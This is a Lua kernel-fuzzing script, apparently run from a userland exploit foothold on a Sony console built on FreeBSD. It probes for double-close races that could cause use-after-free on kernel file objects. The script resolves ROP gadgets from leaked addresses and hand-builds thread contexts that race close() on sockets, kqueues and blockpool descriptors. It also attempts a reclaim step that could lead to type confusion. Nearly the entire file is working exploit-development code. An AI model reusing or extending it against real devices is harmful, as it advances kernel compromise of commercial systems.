-- CRASH_CLASS: HIGH
-- PROBE 101a: Double-close race — N threads close(same_fd) simultaneously
--
-- Context: FreeBSD close() does fdfree() → fdrop(). If two threads both
-- enter close(fd) before the fd table entry is removed, both get the file
-- pointer and both call fdrop() → refcount underflow → UAF on struct file.
-- Standard FreeBSD serializes via FILEDESC_XLOCK, but Sony may have changed
-- the locking. Also tests: accept()+close(listener) race, and concurrent
-- close on blockpool fds (sys 653 allocates 3 fds per call).
--
-- Detection: canary (getpid), VM counter (sys 624), process survival.
-- Each round creates a fresh object and races close from 4-8 threads.

print("=== PROBE 101a: DOUBLE-CLOSE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local NCLOSE=6
local ROUNDS=15
local STK_PG=1; local PG_PER=STK_PG+1
local MAX_CH=NCLOSE*ROUNDS*4+10
local TOTAL_PG=4+MAX_CH*PG_PER
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl1=R+0x20; wq(sl1,uint64(0)); wq(sl1+8,uint64(1000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl10=R+0x60; wq(sl10,uint64(0)); wq(sl10+8,uint64(10000000))
local tb=R+0x80
local FLAG_BASE=R+0x100

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local cidx=0
local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end

local function spawn_closer(fd, flag_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)

    -- ROP chain: close(fd) → write 1 to flag → nanosleep(999s)
    -- The initial context sets RDI=fd, RAX=6 (close), IP=SA
    -- After close returns: write exit flag, then sleep
    local off=0
    -- After close(fd) returns, chain continues from stack:
    -- Step 1: thr_exit-like flag write via store gadget
    -- We don't have a store gadget, so use thr_exit(431) with flag_addr
    -- thr_exit writes 1 to *arg and wakes futex waiters
    wq(stk+off, PRDI); off=off+8
    wq(stk+off, uint64(flag_addr)); off=off+8
    wq(stk+off, PRAX); off=off+8
    wq(stk+off, uint64(431)); off=off+8
    wq(stk+off, SA); off=off+8
    -- After thr_exit, thread is dead — no more chain needed

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(6))        -- close
    wq(ctx+_DI,uint64(fd))       -- fd to close
    wq(ctx+_SI,uint64(0))
    wq(ctx+_DX,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local function mkpair()
    local sv=memory.alloc(8); wq(sv,uint64(0))
    local rv=N(native.fcall_with_rax(stub,135,1,1,0,N(sv)))
    if rv~=0 then return nil,nil end
    return rd(sv), rd(sv+4)
end

print("")
print("--- A: UNIX SOCKET DOUBLE-CLOSE ---")
print("(6 threads all close(B) simultaneously, 15 rounds)")

local hits_a=0
local vm0=vmc()
for round=1,ROUNDS do
    local A,B=mkpair()
    if not A then print(string.format("A[%d]: PAIR FAIL",round)) break end

    -- Spawn NCLOSE children, all close(B)
    local flags={}
    for i=1,NCLOSE do
        local fa=FLAG_BASE+(round-1)*NCLOSE*8+(i-1)*8
        wq(fa, uint64(0))
        flags[i]=fa
        spawn_closer(B, fa)
    end

    -- No sleep — let them all race immediately
    -- Then wait a bit for dust to settle
    native.fcall_with_rax(stub,240,sl10,0)

    -- Check: how many actually closed? (thr_exit flag = 1)
    local exited=0
    for i=1,NCLOSE do
        local f=rd(flags[i]) or 0
        if f~=0 then exited=exited+1 end
    end

    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        hits_a=hits_a+1
        print(string.format("A[%02d]: !! CANARY=%d exited=%d",round,c,exited))
    end
    if round%5==0 then
        local vm1=vmc()
        print(string.format("A[%02d]: ok ch=%d exit=%d/%d vm=%d",round,cidx,exited,NCLOSE,vm1))
    end

    -- Clean up A (B should already be closed by children)
    native.fcall_with_rax(stub,6,A)

    if c~=pid then break end
end
local vmA=vmc()
print(string.format("A done: hits=%d vm=%d->%d d=%d",hits_a,vm0,vmA,vmA-vm0))

-- ============================================================
print("")
print("--- B: INET SOCKET DOUBLE-CLOSE ---")
print("(6 threads close(inet_sock), 10 rounds)")

local hits_b=0
local ROUNDS_B=10
vm0=vmc()
for round=1,ROUNDS_B do
    -- AF_INET DGRAM socket
    local fd=N(native.fcall_with_rax(stub,97,2,2,0))
    if fd<=0 then print(string.format("B[%d]: SOCKET FAIL fd=%d",round,fd)) break end

    local flags={}
    for i=1,NCLOSE do
        local fa=FLAG_BASE+0x2000+(round-1)*NCLOSE*8+(i-1)*8
        wq(fa, uint64(0))
        flags[i]=fa
        spawn_closer(fd, fa)
    end

    native.fcall_with_rax(stub,240,sl10,0)

    local exited=0
    for i=1,NCLOSE do
        local f=rd(flags[i]) or 0
        if f~=0 then exited=exited+1 end
    end

    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        hits_b=hits_b+1
        print(string.format("B[%02d]: !! CANARY=%d exited=%d",round,c,exited))
    end
    if round%5==0 then
        local vm1=vmc()
        print(string.format("B[%02d]: ok ch=%d exit=%d/%d vm=%d",round,cidx,exited,NCLOSE,vm1))
    end

    if c~=pid then break end
end
local vmB=vmc()
print(string.format("B done: hits=%d vm=%d->%d d=%d",hits_b,vm0,vmB,vmB-vm0))

-- ============================================================
print("")
print("--- C: KQUEUE DOUBLE-CLOSE ---")
print("(6 threads close(kq_fd), 10 rounds)")

local hits_c=0
local ROUNDS_C=10
vm0=vmc()
for round=1,ROUNDS_C do
    -- kqueue()
    local kq=N(native.fcall_with_rax(stub,362))
    if kq<=0 then print(string.format("C[%d]: KQUEUE FAIL fd=%d",round,kq)) break end

    local flags={}
    for i=1,NCLOSE do
        local fa=FLAG_BASE+0x4000+(round-1)*NCLOSE*8+(i-1)*8
        wq(fa, uint64(0))
        flags[i]=fa
        spawn_closer(kq, fa)
    end

    native.fcall_with_rax(stub,240,sl10,0)

    local exited=0
    for i=1,NCLOSE do
        local f=rd(flags[i]) or 0
        if f~=0 then exited=exited+1 end
    end

    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        hits_c=hits_c+1
        print(string.format("C[%02d]: !! CANARY=%d exited=%d",round,c,exited))
    end
    if round%5==0 then
        local vm1=vmc()
        print(string.format("C[%02d]: ok ch=%d exit=%d/%d vm=%d",round,cidx,exited,NCLOSE,vm1))
    end

    if c~=pid then break end
end
local vmC=vmc()
print(string.format("C done: hits=%d vm=%d->%d d=%d",hits_c,vm0,vmC,vmC-vm0))

-- ============================================================
print("")
print("--- D: CLOSE + IMMEDIATE RECLAIM (type confusion) ---")
print("(1 thread close(unix_B), main reclaims with AF_INET, 10 rounds)")

local hits_d=0
local reclaimed=0
local ROUNDS_D=10
vm0=vmc()
for round=1,ROUNDS_D do
    local A,B=mkpair()
    if not A then print(string.format("D[%d]: PAIR FAIL",round)) break end

    -- Spawn ONE closer for B
    local fa=FLAG_BASE+0x6000+(round-1)*8
    wq(fa, uint64(0))
    spawn_closer(B, fa)

    -- IMMEDIATELY try to reclaim fd B with AF_INET
    local nf=N(native.fcall_with_rax(stub,97,2,2,0))
    if nf==B then reclaimed=reclaimed+1 end

    native.fcall_with_rax(stub,240,sl10,0)

    local exited=rd(fa) or 0
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        hits_d=hits_d+1
        print(string.format("D[%02d]: !! CANARY=%d nf=%d ex=%d",round,c,nf,exited))
    end
    if round%5==0 then
        print(string.format("D[%02d]: ok nf=%d recl=%d/%d ex=%d ch=%d",
            round,nf,reclaimed,round,exited,cidx))
    end

    native.fcall_with_rax(stub,6,A)
    if nf>0 and nf~=B then native.fcall_with_rax(stub,6,nf) end

    if c~=pid then break end
end
local vmD=vmc()
print(string.format("D done: hits=%d recl=%d/%d vm=%d->%d d=%d",
    hits_d,reclaimed,ROUNDS_D,vm0,vmD,vmD-vm0))

-- ============================================================
print("")
print("--- E: BLOCKPOOL (sys 653) CLOSE RACE ---")
print("(create blockpool, 6 threads close one fd, 5 rounds)")

local sc653=mk(653)
local hits_e=0
local ROUNDS_E=5
vm0=vmc()
for round=1,ROUNDS_E do
    -- sys 653 creates blockpool, returns 3 fds in a buffer
    local bp_buf=memory.alloc(32); z(bp_buf,32)
    local rv653
    local ok653,r653=pcall(function()
        return sc653(uint64(bp_buf),uint64(0),uint64(0))
    end)
    if ok653 then rv653=N(r653) else rv653=-999 end

    local fd0=rd(bp_buf) or 0
    local fd1=rd(bp_buf+4) or 0
    local fd2=rd(bp_buf+8) or 0
    if round==1 then
        print(string.format("  653 rv=%d fds=%d,%d,%d",rv653,fd0,fd1,fd2))
    end

    if rv653~=0 or fd0<=0 then
        print(string.format("E[%d]: 653 FAIL rv=%d",round,rv653))
        break
    end

    -- Race: 6 threads close(fd0) simultaneously
    local flags={}
    for i=1,NCLOSE do
        local fa=FLAG_BASE+0x8000+(round-1)*NCLOSE*8+(i-1)*8
        wq(fa, uint64(0))
        flags[i]=fa
        spawn_closer(fd0, fa)
    end

    native.fcall_with_rax(stub,240,sl10,0)

    local exited=0
    for i=1,NCLOSE do
        local f=rd(flags[i]) or 0
        if f~=0 then exited=exited+1 end
    end

    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then
        hits_e=hits_e+1
        print(string.format("E[%02d]: !! CANARY=%d exited=%d",round,c,exited))
    else
        print(string.format("E[%02d]: ok ex=%d/%d ch=%d",round,exited,NCLOSE,cidx))
    end

    -- Clean up remaining fds
    native.fcall_with_rax(stub,6,fd1)
    native.fcall_with_rax(stub,6,fd2)

    if c~=pid then break end
end
local vmE=vmc()
print(string.format("E done: hits=%d vm=%d->%d d=%d",hits_e,vm0,vmE,vmE-vm0))

-- ============================================================
print("")
print(string.format("SUMMARY: A=%d B=%d C=%d D=%d E=%d ch=%d",
    hits_a,hits_b,hits_c,hits_d,hits_e,cidx))
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("canary=%s", fc==pid and "OK" or "!!FAIL="..fc))
print("=== 101a COMPLETE ===")
